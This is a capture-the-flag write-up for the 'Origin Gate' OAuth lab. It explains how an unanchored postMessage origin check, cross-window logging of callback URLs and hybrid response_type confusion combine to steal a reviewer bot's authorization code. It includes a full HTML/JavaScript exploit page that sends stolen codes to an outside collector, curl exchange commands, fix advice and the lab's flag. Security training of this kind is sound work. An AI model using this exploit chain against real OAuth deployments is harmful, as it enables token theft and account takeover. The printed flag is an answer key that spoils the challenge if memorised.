# Solo Leveling: Origin Gate — OAuth Hybrid Flow + postMessage Logger Exfil

## What Is Happening

The [Origin Gate lab](https://solo-leveling-3-f8c7823797de.pwnbox-lab.com/) uses Google OAuth for login and exposes a cross-window `/logger` channel. A reviewer bot with an active Google IdP session can be sent to attacker pages through `POST /report`.

The flag appears on `/profile` only for the hidden reviewer identity **Statue of God**, not for default user `pwnu`.

## Why It Happens

Three bugs chain together:

1. **Weak postMessage origin allowlist on `/logger`**
   - Regex lacks a `$` end anchor.
   - `https://solo-leveling-3-f8c7823797de.pwnbox-lab.com.l30on.top` matches and can send `{type:'get'}` to steal logger contents.

2. **Sensitive OAuth data logged cross-window**
   - `/error` embeds `/logger` and posts `window.location.href` into storage.
   - Hash fragments survive redirects like `/error?type=missing_code#code=...`.

3. **OAuth response-type / redirect_uri parser confusion**
   - `redirect_uri=callback#` puts the code in the hash for logger exfil, but server exchange uses `/callback` → `token_exchange_failed`.
   - `response_type=code token` with `redirect_uri=/callback` puts the **code in the hash** while the code is still issued for `/callback`, so exchange succeeds after exfil.

Attacker-controlled OAuth `state` works by pre-seeding a session on `GET /` and embedding that `state` in the bot OAuth URL. The bot only supplies the Google identity via `prompt=none`.

## Exploit Chain

1. Attacker `GET /` → save `state` and `connect.sid`.
2. Host exploit on suffix-bypass origin (`*.solo-leveling-3-....pwnbox-lab.com.attacker.tld`).
3. Exploit opens hybrid OAuth in bot:

```text
response_type=code token
redirect_uri=https://solo-leveling-3-f8c7823797de.pwnbox-lab.com/callback
prompt=none
state=<attacker_state>
```

4. Bot lands on `/callback#code=...&access_token=...&state=...` → `/error` → logger stores full URL.
5. Exploit polls logger with `{type:'get'}` and exfiltrates to OAST.
6. Attacker exchanges stolen code on pre-seeded session:

```bash
curl -sS -b "connect.sid=<saved>" \
  "https://solo-leveling-3-f8c7823797de.pwnbox-lab.com/callback?code=<stolen>&state=<attacker_state>"
```

7. `GET /profile` → flag.

## Exact Test

Verify suffix bypass + logger read from hosted page:

```javascript
const lg = window.open('https://solo-leveling-3-f8c7823797de.pwnbox-lab.com/logger');
window.addEventListener('message', e => {
  if (e.data?.type === 'loggerData') console.log(e.data.data);
});
setInterval(() => lg.postMessage({ type: 'get' }, '*'), 500);
```

Verify hybrid redirect shape:

```bash
curl -sI "https://google-f8c7823797de.pwnbox-lab.com/o/oauth2/v2/auth?client_id=solo-leveling-3-client&redirect_uri=https%3A%2F%2Fsolo-leveling-3-f8c7823797de.pwnbox-lab.com%2Fcallback&response_type=code+token&scope=openid+email+profile&state=test&prompt=none" | grep -i location
```

Expected: `callback#code=...&access_token=...`

## Working Exploit Shape

```html
<!doctype html>
<meta charset=utf-8>
<script>
const Sa = '<attacker_state_from_preshot_session>';
const SL = 'https://solo-leveling-3-f8c7823797de.pwnbox-lab.com';
const G = 'https://google-f8c7823797de.pwnbox-lab.com';
const OAST = 'https://[collector]/x';

window.addEventListener('message', e => {
  if (!e.data || e.data.type !== 'loggerData' || !e.data.data) return;
  fetch(OAST + '?d=' + encodeURIComponent(e.data.data));
  try {
    const href = JSON.parse(e.data.data).data || '';
    const m = href.match(/code=([^&]+)/);
    if (m) fetch(OAST + '?code=' + encodeURIComponent(m[1]));
  } catch (err) {}
});

const oauth = G + '/o/oauth2/v2/auth?client_id=solo-leveling-3-client'
  + '&redirect_uri=' + encodeURIComponent(SL + '/callback')
  + '&response_type=code+token&scope=openid%20email%20profile&prompt=none&state=' + Sa;

window.open(oauth, 'oauth');
setTimeout(() => {
  const lg = window.open(SL + '/logger', 'logger');
  setInterval(() => { try { lg.postMessage({ type: 'get' }, '*'); } catch (e) {} }, 500);
}, 8000);
</script>
```

Report hosted URL via `POST /report`.

## Expected Signal

- OAST receives logger JSON whose `data` field contains `code=` in the hash.
- Attacker-side exchange redirects to `/profile`, not `/error?type=token_exchange_failed`.
- Profile heading becomes `Statue of God`.
- `.flag-value` contains `pwnbox{...}`.

## Root Cause

Cross-window logging of full OAuth callback URLs without strict origin controls, combined with accepting hybrid OAuth responses that place authorization codes in fragments while the backend exchanges against the query-string redirect URI.

## Impact

- Theft of authorization codes and access tokens via cross-window messaging
- Account takeover of privileged reviewer identity
- Disclosure of lab flag / sensitive profile data

## Fix

- Anchor and strictly parse postMessage origin allowlists
- Never store or relay OAuth callback URLs through cross-window channels
- Disallow hybrid/implicit response types if only authorization-code flow is intended
- Validate `redirect_uri` exactly at authorize and token endpoints
- Treat `prompt=none` as sensitive for high-privilege IdP sessions

## Flag

`pwnbox{b931c8f34e352c8bdd0f6f65b6ae2b21}`
